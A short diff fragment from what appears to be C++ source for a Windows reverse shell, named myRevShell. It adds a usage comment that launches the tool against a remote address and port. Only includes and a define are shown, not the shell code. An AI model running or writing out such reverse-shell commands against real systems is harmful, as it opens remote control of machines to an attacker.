@@ -1,4 +1,5 @@
 // Please modify the code and DONT USE AS-IS, no matter legal or illegal activity
+// Usage: myRevShell.exe 192.168.158.52 9001
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <vector>
